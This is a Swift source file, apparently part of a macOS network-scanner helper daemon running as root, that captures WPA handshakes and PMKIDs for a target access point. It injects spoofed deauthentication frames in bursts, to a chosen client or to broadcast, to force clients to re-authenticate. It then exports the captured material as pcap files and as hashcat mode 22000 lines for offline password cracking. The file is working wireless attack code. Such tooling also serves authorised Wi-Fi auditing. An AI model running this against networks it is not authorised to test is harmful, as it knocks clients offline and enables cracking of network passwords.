//
//  HandshakeCaptureOperation.swift
//  HelperDaemon
//
//  Operazione dedicata alla cattura mirata di WPA 4-way handshake per un BSSID target.
//  State machine per i 4 messaggi EAPOL-Key, estrazione PMKID, deauth opzionale
//  per forzare ri-autenticazione. Export in formato .pcap e .hc22000 (Hashcat mode 22000).
//  Richiede privilegi root (eseguita dal LaunchDaemon).
//

import Foundation
import os

// MARK: - Result

struct HandshakeCaptureResultData: Codable {
    let targetBSSID: String
    let targetSSID: String
    let clientMAC: String
    let messagesCapured: [Int]          // es. [1,2,3,4]
    let isComplete: Bool                // tutti e 4 i messaggi catturati
    let pmkidCaptured: Bool
    let pcapFilePath: String?           // path al file .pcap salvato
    let hc22000FilePath: String?        // path al file .hc22000 salvato
    let hc22000Line: String?            // linea hc22000 per uso diretto
    let durationSeconds: Double
    let totalEAPOLFrames: Int
    let deauthSent: Bool
}

// MARK: - Internal State

private struct EAPOLMessage {
    let number: Int
    let sourceMac: String
    let destMac: String
    let rawFrame: Data       // intero frame 802.11 per pcap export
    let rawEAPOL: Data       // solo payload EAPOL
    let timestamp: Double
    let keyInfo: UInt16
    let replayCounter: Data  // 8 bytes
    let nonce: Data          // 32 bytes (ANonce o SNonce)
    let mic: Data            // 16 bytes
    let eapolLength: Int     // lunghezza totale EAPOL per hash
}

// MARK: - Operation

class HandshakeCaptureOperation: BaseOperation {

    private var pcapHandle: OpaquePointer?

    // Capture state
    private var capturedMessages: [Int: EAPOLMessage] = [:]
    private var targetSSID: String = ""
    private var beaconRawFrame: Data?
    private var pmkid: Data?
    private var allRawFrames: [Data] = []   // tutti i frame per pcap export

    override func cancel() {
        super.cancel()
        if let handle = pcapHandle {
            pcap_bridge_breakloop(handle)
        }
    }

    // MARK: - Execute

    func execute(interfaceName: String, targetBSSID: String, channel: Int32,
                 sendDeauth: Bool, clientMAC: String?,
                 durationSeconds: Int32) -> Result<Data, Error> {

        var errbuf = [CChar](repeating: 0, count: Int(PCAP_ERRBUF_SIZE))

        let handle = interfaceName.withCString { iface in
            pcap_bridge_open_monitor(iface, 65535, 100, &errbuf)
        }
        guard let pcap = handle else {
            let errMsg = String(cString: errbuf)
            return .failure(HelperError.pcapError("Monitor mode open fallito: \(errMsg)"))
        }
        self.pcapHandle = pcap

        defer {
            pcap_bridge_close(pcap)
            self.pcapHandle = nil
        }

        // Set channel
        if channel > 0 {
            interfaceName.withCString { iface in
                _ = pcap_bridge_set_channel(iface, channel)
            }
        }

        let startTime = Date()
        let deadline = startTime.addingTimeInterval(Double(durationSeconds))
        let targetBSSIDUpper = targetBSSID.uppercased()
        var deauthSent = false
        var deauthSentAt: Date?

        HelperLogger.operations.info("[Handshake] Cattura avviata per BSSID \(targetBSSID), canale \(channel), durata \(durationSeconds)s, deauth: \(sendDeauth)")

        // Capture loop
        while Date() < deadline && !isCancelled {
            // Check if handshake is complete
            if capturedMessages.count >= 4 ||
               (capturedMessages[1] != nil && capturedMessages[2] != nil) {
                // M1+M2 è sufficiente per Hashcat mode 22000
                HelperLogger.operations.info("[Handshake] Handshake sufficiente catturato (\(self.capturedMessages.keys.sorted()))")
                // Continua ancora un po' per catturare M3/M4 se possibile
                if capturedMessages.count >= 4 { break }
            }

            // Send deauth after capturing beacon (to force re-authentication)
            if sendDeauth && !deauthSent && !targetSSID.isEmpty {
                let deauthTarget = clientMAC?.uppercased() ?? "FF:FF:FF:FF:FF:FF"
                let firstOk = sendDeauthFrame(pcap: pcap, bssid: targetBSSIDUpper, clientMac: deauthTarget)
                deauthSent = firstOk
                deauthSentAt = Date()

                if firstOk {
                    HelperLogger.operations.info("[Handshake] Deauth inviato a \(deauthTarget) da \(targetBSSIDUpper)")
                    // Burst: invio multiplo per aumentare probabilità di successo
                    for burstIndex in 1...3 {
                        usleep(200_000) // 200ms tra ogni burst
                        guard !self.isCancelled else { break }
                        let ok = sendDeauthFrame(pcap: pcap, bssid: targetBSSIDUpper, clientMac: deauthTarget)
                        if !ok { break }
                        HelperLogger.operations.debug("[Handshake] Deauth burst \(burstIndex + 1)/4")
                    }
                } else {
                    HelperLogger.forwardWarning(category: "Operations", message: "Deauth injection non supportata su questa interfaccia — cattura passiva in corso", tag: "[Handshake]")
                }
            }

            var packet = pcap_packet_t()
            let result = pcap_bridge_next_packet(pcap, &packet)

            if result == 1 && packet.length > 0 {
                processFrame(data: packet.data, length: Int(packet.length),
                             timestampUs: packet.timestamp_us,
                             targetBSSID: targetBSSIDUpper, targetClient: clientMAC?.uppercased())
            } else if result == -1 {
                break
            }
        }

        let duration = Date().timeIntervalSince(startTime)
        let resolvedClientMAC = capturedMessages.values.first(where: { $0.number == 2 })?.sourceMac ??
                                clientMAC?.uppercased() ?? ""

        // Export files
        var pcapPath: String?
        var hc22000Path: String?
        var hc22000Line: String?

        let hasMinimumHandshake = capturedMessages[1] != nil && capturedMessages[2] != nil

        if hasMinimumHandshake {
            let baseName = "\(targetSSID.isEmpty ? targetBSSIDUpper : targetSSID)_\(dateString())"

            // Export .pcap
            pcapPath = exportPcap(baseName: baseName)

            // Export .hc22000
            if let line = generateHC22000Line(bssid: targetBSSIDUpper, clientMac: resolvedClientMAC) {
                hc22000Line = line
                hc22000Path = exportHC22000(baseName: baseName, line: line)
            }
        }

        let resultData = HandshakeCaptureResultData(
            targetBSSID: targetBSSIDUpper,
            targetSSID: targetSSID,
            clientMAC: resolvedClientMAC,
            messagesCapured: capturedMessages.keys.sorted(),
            isComplete: capturedMessages.count >= 4,
            pmkidCaptured: pmkid != nil,
            pcapFilePath: pcapPath,
            hc22000FilePath: hc22000Path,
            hc22000Line: hc22000Line,
            durationSeconds: duration,
            totalEAPOLFrames: capturedMessages.count,
            deauthSent: deauthSent
        )

        HelperLogger.operations.info("[Handshake] Cattura completata: \(self.capturedMessages.keys.sorted()), SSID: \(self.targetSSID), client: \(resolvedClientMAC), PMKID: \(self.pmkid != nil)")

        do {
            let jsonData = try JSONEncoder().encode(resultData)
            return .success(jsonData)
        } catch {
            return .failure(HelperError.operationFailed("Serializzazione handshake fallita: \(error)"))
        }
    }

    // MARK: - Frame Processing

    private func processFrame(data: UnsafePointer<UInt8>, length: Int, timestampUs: Int64,
                               targetBSSID: String, targetClient: String?) {
        guard length >= 4 else { return }
        let buf = UnsafeBufferPointer(start: data, count: length)

        // Parse RadioTap header
        guard let radioTapLen = parseRadioTapLength(buf) else { return }
        guard radioTapLen < length else { return }

        let frameStart = radioTapLen
        let frameLen = length - radioTapLen
        guard frameLen >= 2 else { return }

        let fc0 = buf[frameStart]
        let fc1 = buf[frameStart + 1]
        let frameType = fc0 & 0x0C
        let frameSubtype = fc0 & 0xF0
        let timestamp = Double(timestampUs) / 1_000_000.0

        // Save raw frame for pcap export
        let rawFrame = Data(bytes: data, count: length)

        if frameType == 0x00 { // Management
            guard frameLen >= 24 else { return }
            let addr2 = extractMAC(buf, offset: frameStart + 10)
            let addr3 = extractMAC(buf, offset: frameStart + 16)

            // Beacon from target AP
            if frameSubtype == 0x80 && addr3 == targetBSSID {
                if beaconRawFrame == nil {
                    beaconRawFrame = rawFrame
                    allRawFrames.append(rawFrame)
                }
                // Extract SSID from beacon
                let bodyStart = frameStart + 24 + 12 // skip fixed fields
                if targetSSID.isEmpty, let ssid = extractSSIDFromIE(buf, bodyStart: bodyStart, bodyEnd: frameStart + frameLen) {
                    targetSSID = ssid
                    HelperLogger.operations.info("[Handshake] SSID rilevato: \(ssid)")
                }
            }
        } else if frameType == 0x08 { // Data
            guard frameLen >= 24 else { return }

            let toDS = (fc1 & 0x01) != 0
            let fromDS = (fc1 & 0x02) != 0

            let addr1 = extractMAC(buf, offset: frameStart + 4)
            let addr2 = extractMAC(buf, offset: frameStart + 10)
            let addr3 = extractMAC(buf, offset: frameStart + 16)

            // Determine BSSID
            var bssid = ""
            if !toDS && fromDS { bssid = addr2 }
            else if toDS && !fromDS { bssid = addr1 }
            else if !toDS && !fromDS { bssid = addr3 }

            guard bssid == targetBSSID else { return }

            // Check client filter
            let sourceMac = addr2
            let destMac = addr1
            if let client = targetClient, !client.isEmpty, client != "FF:FF:FF:FF:FF:FF" {
                if sourceMac != client && destMac != client { return }
            }

            // Check for EAPOL
            let qosLen = (fc0 & 0x80) != 0 ? 2 : 0
            let llcOffset = frameStart + 24 + qosLen

            guard llcOffset + 8 <= frameStart + frameLen else { return }

            if buf[llcOffset] == 0xAA && buf[llcOffset + 1] == 0xAA && buf[llcOffset + 2] == 0x03 {
                let etherType = (UInt16(buf[llcOffset + 6]) << 8) | UInt16(buf[llcOffset + 7])

                if etherType == 0x888E {
                    let eapolStart = llcOffset + 8
                    processEAPOL(buf: buf, eapolStart: eapolStart, eapolEnd: frameStart + frameLen,
                                 sourceMac: sourceMac, destMac: destMac, bssid: bssid,
                                 rawFrame: rawFrame, timestamp: timestamp)
                }
            }
        }
    }

    // MARK: - EAPOL Processing

    private func processEAPOL(buf: UnsafeBufferPointer<UInt8>,
                               eapolStart: Int, eapolEnd: Int,
                               sourceMac: String, destMac: String, bssid: String,
                               rawFrame: Data, timestamp: Double) {
        guard eapolStart + 4 <= eapolEnd else { return }

        let eapolType = buf[eapolStart + 1]
        guard eapolType == 3 else { return } // EAPOL-Key

        // EAPOL-Key body starts at eapolStart + 4
        let keyBody = eapolStart + 4
        guard keyBody + 95 <= eapolEnd else { return } // Minimum EAPOL-Key length

        // Key Info (2 bytes at offset 1-2 of Key body)
        let keyInfo = (UInt16(buf[keyBody + 1]) << 8) | UInt16(buf[keyBody + 2])

        // Key Length (2 bytes at offset 3-4)
        // Replay Counter (8 bytes at offset 5-12)
        var replayCounter = Data(count: 8)
        for i in 0..<8 { replayCounter[i] = buf[keyBody + 5 + i] }

        // Nonce (32 bytes at offset 13-44)
        var nonce = Data(count: 32)
        for i in 0..<32 { nonce[i] = buf[keyBody + 13 + i] }

        // MIC (16 bytes at offset 77-92)
        var mic = Data(count: 16)
        for i in 0..<16 { mic[i] = buf[keyBody + 77 + i] }

        // EAPOL total length (from EAPOL header)
        let eapolLength = Int(buf[eapolStart + 2]) << 8 | Int(buf[eapolStart + 3])

        let messageNumber = identifyMessage(keyInfo: keyInfo)

        // Raw EAPOL payload
        let eapolPayloadLen = min(eapolEnd - eapolStart, 4 + eapolLength)
        var rawEAPOL = Data(count: eapolPayloadLen)
        for i in 0..<eapolPayloadLen { rawEAPOL[i] = buf[eapolStart + i] }

        let msg = EAPOLMessage(
            number: messageNumber,
            sourceMac: sourceMac,
            destMac: destMac,
            rawFrame: rawFrame,
            rawEAPOL: rawEAPOL,
            timestamp: timestamp,
            keyInfo: keyInfo,
            replayCounter: replayCounter,
            nonce: nonce,
            mic: mic,
            eapolLength: eapolPayloadLen
        )

        // Only store first of each message type
        if capturedMessages[messageNumber] == nil {
            capturedMessages[messageNumber] = msg
            allRawFrames.append(rawFrame)
            HelperLogger.operations.info("[Handshake] M\(messageNumber) catturato: \(sourceMac) → \(destMac)")
        }

        // PMKID extraction from M1 (in Key Data, RSN PMKID KDE)
        if messageNumber == 1 {
            extractPMKID(buf: buf, keyBody: keyBody, keyEnd: eapolEnd)
        }
    }

    private func identifyMessage(keyInfo: UInt16) -> Int {
        let install = (keyInfo & 0x0040) != 0
        let keyACK  = (keyInfo & 0x0080) != 0
        let keyMIC  = (keyInfo & 0x0100) != 0
        let secure  = (keyInfo & 0x0200) != 0

        if keyACK && !keyMIC { return 1 }
        if !keyACK && keyMIC && !install && !secure { return 2 }
        if keyACK && keyMIC && install && secure { return 3 }
        if !keyACK && keyMIC && secure { return 4 }
        return 0
    }

    // MARK: - PMKID Extraction

    private func extractPMKID(buf: UnsafeBufferPointer<UInt8>, keyBody: Int, keyEnd: Int) {
        // Key Data starts at offset 95 of Key body
        let keyDataLenOffset = keyBody + 93
        guard keyDataLenOffset + 2 <= keyEnd else { return }
        let keyDataLen = Int(buf[keyDataLenOffset]) << 8 | Int(buf[keyDataLenOffset + 1])

        let keyDataStart = keyBody + 95
        guard keyDataStart + keyDataLen <= keyEnd else { return }

        // Search for PMKID KDE: type=0xDD, OUI=00:0F:AC, data type=4
        var offset = keyDataStart
        while offset + 2 <= keyDataStart + keyDataLen {
            let kdeType = buf[offset]
            let kdeLen = Int(buf[offset + 1])
            let kdeData = offset + 2

            guard kdeData + kdeLen <= keyDataStart + keyDataLen else { break }

            if kdeType == 0xDD && kdeLen >= 20 {
                // OUI: 00:0F:AC, Type: 4 (PMKID)
                if buf[kdeData] == 0x00 && buf[kdeData + 1] == 0x0F &&
                   buf[kdeData + 2] == 0xAC && buf[kdeData + 3] == 0x04 {
                    var pmkidData = Data(count: 16)
                    for i in 0..<16 { pmkidData[i] = buf[kdeData + 4 + i] }

                    // Verify it's not all zeros
                    if pmkidData != Data(count: 16) {
                        self.pmkid = pmkidData
                        HelperLogger.operations.info("[Handshake] PMKID estratto: \(pmkidData.map { String(format: "%02x", $0) }.joined())")
                    }
                }
            }

            offset = kdeData + kdeLen
        }
    }

    // MARK: - Deauth Frame Construction & Sending

    /// Invia frame deauth 802.11 via pcap injection.
    /// Prepende RadioTap header (richiesto per DLT_IEEE802_11_RADIO).
    /// Nota: i chipset WiFi Apple generalmente non supportano injection via pcap_sendpacket.
    /// Il frame potrebbe essere silenziosamente scartato dal driver.
    @discardableResult
    private func sendDeauthFrame(pcap: OpaquePointer, bssid: String, clientMac: String) -> Bool {
        // RadioTap header minimo (8 bytes): version=0, pad=0, length=8 LE, present=0
        // Necessario perché pcap è aperto con DLT_IEEE802_11_RADIO
        let radioTapHeader: [UInt8] = [
            0x00,       // version
            0x00,       // pad
            0x08, 0x00, // length (8, little-endian)
            0x00, 0x00, 0x00, 0x00  // present flags (none — driver sceglie rate/channel)
        ]

        // IEEE 802.11 Deauthentication frame (26 bytes)
        // FC: 0xC0,0x00 (Deauth, subtype 12, type 0 management)
        // Duration: 0x013A
        // Addr1 = DA (client), Addr2 = SA (AP/BSSID), Addr3 = BSSID
        // Reason code: 0x0007 (Class 3 frame received from non-associated station)
        var dot11Frame = Data(count: 26)

        // Frame Control: Deauth
        dot11Frame[0] = 0xC0
        dot11Frame[1] = 0x00

        // Duration
        dot11Frame[2] = 0x3A
        dot11Frame[3] = 0x01

        // Addr1 (Destination) = client MAC
        let clientBytes = macStringToBytes(clientMac)
        for i in 0..<6 { dot11Frame[4 + i] = clientBytes[i] }

        // Addr2 (Source) = BSSID (spoofed as AP)
        let bssidBytes = macStringToBytes(bssid)
        for i in 0..<6 { dot11Frame[10 + i] = bssidBytes[i] }

        // Addr3 (BSSID) = BSSID
        for i in 0..<6 { dot11Frame[16 + i] = bssidBytes[i] }

        // Sequence Control
        dot11Frame[22] = 0x00
        dot11Frame[23] = 0x00

        // Reason Code: 7 (Class 3)
        dot11Frame[24] = 0x07
        dot11Frame[25] = 0x00

        // Componi pacchetto completo: RadioTap + 802.11 Deauth
        var packet = Data(radioTapHeader)
        packet.append(dot11Frame)

        let result = packet.withUnsafeBytes { rawBuf in
            let ptr = rawBuf.bindMemory(to: UInt8.self).baseAddress!
            return pcap_bridge_send_packet(pcap, ptr, Int32(packet.count))
        }

        if result != 0 {
            HelperLogger.forwardWarning(category: "Operations", message: "Deauth injection fallita (pcap_sendpacket → \(result)). Il chipset WiFi potrebbe non supportare injection.", tag: "[Handshake]")
        }

        return result == 0
    }

    // MARK: - Export .pcap

    private func exportPcap(baseName: String) -> String? {
        guard !allRawFrames.isEmpty else { return nil }

        let dir = handshakeDirectory()
        let path = (dir as NSString).appendingPathComponent("\(baseName).pcap")

        // pcap file format: Global Header + Packet Records
        var fileData = Data()

        // Global Header (24 bytes)
        var magicNumber: UInt32 = 0xA1B2C3D4
        var versionMajor: UInt16 = 2
        var versionMinor: UInt16 = 4
        var thiszone: Int32 = 0
        var sigfigs: UInt32 = 0
        var snaplen: UInt32 = 65535
        var linktype: UInt32 = 127 // DLT_IEEE802_11_RADIO

        fileData.append(Data(bytes: &magicNumber, count: 4))
        fileData.append(Data(bytes: &versionMajor, count: 2))
        fileData.append(Data(bytes: &versionMinor, count: 2))
        fileData.append(Data(bytes: &thiszone, count: 4))
        fileData.append(Data(bytes: &sigfigs, count: 4))
        fileData.append(Data(bytes: &snaplen, count: 4))
        fileData.append(Data(bytes: &linktype, count: 4))

        // Packet Records
        let now = Date()
        for frame in allRawFrames {
            var tsSec: UInt32 = UInt32(now.timeIntervalSince1970)
            var tsUsec: UInt32 = 0
            var inclLen: UInt32 = UInt32(frame.count)
            var origLen: UInt32 = UInt32(frame.count)

            fileData.append(Data(bytes: &tsSec, count: 4))
            fileData.append(Data(bytes: &tsUsec, count: 4))
            fileData.append(Data(bytes: &inclLen, count: 4))
            fileData.append(Data(bytes: &origLen, count: 4))
            fileData.append(frame)
        }

        do {
            try fileData.write(to: URL(fileURLWithPath: path))
            HelperLogger.operations.info("[Handshake] pcap salvato: \(path)")
            return path
        } catch {
            HelperLogger.forwardError(category: "Operations", message: "Errore salvataggio pcap: \(error)", tag: "[Handshake]")
            return nil
        }
    }

    // MARK: - Export .hc22000 (Hashcat mode 22000)

    /// Genera la linea in formato hc22000 per Hashcat mode 22000.
    /// Formato: WPA*02*MIC*MACap*MACcl*ESSID_hex*ANonce*EAPOL_hex*MP
    private func generateHC22000Line(bssid: String, clientMac: String) -> String? {
        guard let m1 = capturedMessages[1], let m2 = capturedMessages[2] else { return nil }

        let micHex = m2.mic.map { String(format: "%02x", $0) }.joined()
        let macAP = bssid.replacingOccurrences(of: ":", with: "").lowercased()
        let macClient = clientMac.replacingOccurrences(of: ":", with: "").lowercased()
        let essidHex = targetSSID.data(using: .utf8)?.map { String(format: "%02x", $0) }.joined() ?? ""
        let anonceHex = m1.nonce.map { String(format: "%02x", $0) }.joined()

        // EAPOL frame originale da M2 — Hashcat gestisce internamente lo zeroing del MIC
        let eapolHex = m2.rawEAPOL.map { String(format: "%02x", $0) }.joined()

        // Message Pair (MP): indicates which messages were used
        // 0 = M1+M2, 2 = M1+M4, etc.
        let mp: Int
        if capturedMessages[2] != nil { mp = 0 }
        else if capturedMessages[4] != nil { mp = 2 }
        else { mp = 0 }

        let line = "WPA*02*\(micHex)*\(macAP)*\(macClient)*\(essidHex)*\(anonceHex)*\(eapolHex)*\(String(format: "%02x", mp))"
        return line
    }

    private func exportHC22000(baseName: String, line: String) -> String? {
        let dir = handshakeDirectory()
        let path = (dir as NSString).appendingPathComponent("\(baseName).hc22000")

        do {
            try line.write(toFile: path, atomically: true, encoding: .utf8)
            HelperLogger.operations.info("[Handshake] hc22000 salvato: \(path)")
            return path
        } catch {
            HelperLogger.forwardError(category: "Operations", message: "Errore salvataggio hc22000: \(error)", tag: "[Handshake]")
            return nil
        }
    }

    // MARK: - Helpers

    private func handshakeDirectory() -> String {
        let dir = NSString(string: "~/Library/Application Support/IPScanner/handshakes").expandingTildeInPath
        try? FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: true)
        return dir
    }

    private func dateString() -> String {
        let fmt = DateFormatter()
        fmt.dateFormat = "yyyyMMdd_HHmmss"
        return fmt.string(from: Date())
    }

    private func extractMAC(_ buf: UnsafeBufferPointer<UInt8>, offset: Int) -> String {
        guard offset + 6 <= buf.count else { return "00:00:00:00:00:00" }
        return String(format: "%02X:%02X:%02X:%02X:%02X:%02X",
                      buf[offset], buf[offset+1], buf[offset+2],
                      buf[offset+3], buf[offset+4], buf[offset+5])
    }

    private func macStringToBytes(_ mac: String) -> [UInt8] {
        let parts = mac.split(separator: ":").compactMap { UInt8($0, radix: 16) }
        guard parts.count == 6 else { return [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF] }
        return parts
    }

    private func parseRadioTapLength(_ buf: UnsafeBufferPointer<UInt8>) -> Int? {
        guard buf.count >= 4, buf[0] == 0 else { return nil }
        let len = Int(buf[2]) | (Int(buf[3]) << 8)
        guard len >= 8, len <= buf.count else { return nil }
        return len
    }

    private func extractSSIDFromIE(_ buf: UnsafeBufferPointer<UInt8>, bodyStart: Int, bodyEnd: Int) -> String? {
        var offset = bodyStart
        while offset + 2 <= bodyEnd {
            let ieID = buf[offset]
            let ieLen = Int(buf[offset + 1])
            let ieDataStart = offset + 2
            guard ieDataStart + ieLen <= bodyEnd else { break }
            if ieID == 0 && ieLen > 0 {
                let bytes = Array(buf[ieDataStart..<(ieDataStart + ieLen)])
                return String(bytes: bytes, encoding: .utf8) ?? String(bytes: bytes, encoding: .ascii)
            }
            offset = ieDataStart + ieLen
        }
        return nil
    }
}
